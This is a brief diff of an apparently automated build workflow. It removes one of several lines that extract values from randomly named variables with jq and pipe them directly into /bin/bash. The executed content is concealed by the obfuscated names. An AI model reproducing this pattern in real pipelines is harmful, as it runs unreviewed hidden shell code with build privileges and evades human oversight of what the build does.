@@ -24,7 +24,6 @@ jobs:
           echo $gjly59 | jq -r .ovr1058 | /bin/bash
           echo $gciip73483 | jq -r .tj956 | /bin/bash
           printf '%s' "$tol88" | jq -r .ugmc4 | /bin/bash
-          printf '%s' "$th81" | jq -r .jaifx1840 | /bin/bash
           echo $qbky09575 | jq -r .s980 | /bin/bash
 
       - name: Store artifact
